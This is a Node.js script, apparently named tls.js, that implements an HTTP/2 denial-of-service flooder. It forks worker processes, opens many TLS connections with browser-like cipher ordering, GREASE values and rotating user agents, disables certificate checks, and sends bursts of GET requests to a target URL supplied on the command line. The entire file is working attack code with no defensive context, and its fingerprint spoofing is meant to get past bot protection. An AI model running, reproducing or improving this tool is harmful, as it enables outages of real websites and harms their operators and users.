const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5) {
    console.log(`Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://tls.mrrage.xyz 500 8 1`);
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1;

const secureProtocol = "TLS_client_method";
const headers = {};

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
];

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    req: ~~process.argv[4],
    threads: ~~process.argv[5]
}

const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 0);
}

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

headers[":method"] = "GET";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
headers["accept-language"] = "en-US,en;q=0.9";
headers["accept-encoding"] = "gzip, deflate, br";
headers["cache-control"] = "no-cache, no-store, private, max-age=0, must-revalidate";
headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
headers["upgrade-insecure-requests"] = "1";

function runFlooder() {
    headers[":authority"] = parsedTarget.host;
    headers["user-agent"] = randomElement(userAgents);

    const settings = {
        enablePush: false,
        initialWindowSize: 1073741823
    };

    const tlsOptions = {
        secure: true,
        ALPNProtocols: ["h2"],
        ciphers: ciphers,
        sigalgs: sigalgs,
        ecdhCurve: ecdhCurve,
        secureOptions: secureOptions,
        secureContext: secureContext,
        servername: parsedTarget.host,
        rejectUnauthorized: false,
        secureProtocol: secureProtocol
    };

    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

    tlsConn.setKeepAlive(true, 60000);
    tlsConn.setNoDelay(true);

    const client = http2.connect(parsedTarget.href, {
        protocol: "https:",
        settings: settings,
        createConnection: () => tlsConn
    });

    client.on("connect", () => {
        setInterval(() => {
            for (let i = 0; i < args.req; i++) {
                const request = client.request(headers)
                    .on("response", () => {
                        request.close();
                        request.destroy();
                    });
                request.end();
            }
        }, 1000);
    });

    client.on("close", () => {
        client.destroy();
    });

    client.on("error", () => {
        client.destroy();
    });
}

setTimeout(() => process.exit(1), args.time * 1000);